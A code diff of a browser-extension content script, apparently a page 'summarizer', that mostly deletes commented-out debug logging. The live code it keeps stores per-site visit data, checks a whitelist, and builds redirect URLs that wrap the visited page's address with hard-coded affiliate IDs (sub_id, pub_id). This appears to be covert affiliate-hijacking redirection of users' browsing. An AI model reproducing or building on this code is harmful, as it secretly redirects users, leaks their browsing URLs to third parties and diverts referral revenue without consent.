@@ -1,13 +1,3 @@
-// // LOAD CONF
-// fetch(chrome.runtime.getURL('./sum/config.json'))
-//   .then(response => response.json())
-//   .then(config => {
-//     extension_name = config.extension_name;
-//     sub_id = config.sub_id;
-//     pub_id = config.pub_id;
-
-//   })
-//   .catch(error => console.error('Erreur de chargement du fichier config.json:', error));
 const sub_id = 'pp31';
 const pub_id = 'imb4wzji';
 
@@ -34,7 +24,6 @@ function doThat() {
 		let start;
 		const storedData = result[t];
 		if (storedData) {
-			//console.log('[debug] already viewed',storedData);
 			const lastRootDirect = storedData.lastRootDirect;
 			const lastVisiteTimestamp = storedData.lastVisiteTimestamp;
 
@@ -62,7 +51,6 @@ function doThat() {
 			// fallback for getting the wlist
 			chrome.storage.local.get(['wList'], (value) => {
 				wListUCheck = value.wList || {};
-				//console.log("wList & extId loaded from cache"+extensionId+" ",wListUCheck);
 
 				const languageToCountryFallback = {
 					en: 'US', // Anglais -> États-Unis
@@ -97,7 +85,6 @@ function doThat() {
 						sub_id +
 						'&url=' +
 						encodeURIComponent(deleteUrlParam(window.location.href, 'srsltid'));
-					//console.log("[debug] jump",dest);
 
 					const lastWebsiteData = {
 						[t]: {
@@ -120,11 +107,6 @@ function doThat() {
 			});
 		} else {
 			console.log('[debug] page already redirect we stop, actual=' + t + ' lastRootDirect=');
-			//console.log("[debug] page already redirect we stop, actual="+t+" lastRootDirect=",lastRootDirect);
-			//console.log("[debug] set lastDeepLink :",result.lastDeepLink);
-			//console.log("[debug] set lastRootDirectCount :",result.lastRootDirectCount);
-			//console.log("[debug] set debugJumpU :",debugJumpU);
-			//document.documentElement.style.display = '';
 			setTimeout(runSum, 1000);
 		}
 	});
@@ -192,17 +174,10 @@ chrome.storage.local.get(['permissionsGranted'], function (result) {
 	if (result.permissionsGranted !== false) {
 		chrome.storage.local.get(['activate'], function (result) {
 			if (result.activate === undefined) {
-				//console.log('activate is undefined');
 				setTimeout(runSum, 1000);
 			} else if (result.activate === true) {
 				doThat();
-			} else if (result.activate === false) {
-				//console.log('activate is false');
-			} else {
-				//console.log('activate has an unexpected value');
 			}
 		});
-
-		//doThat();
 	}
 });
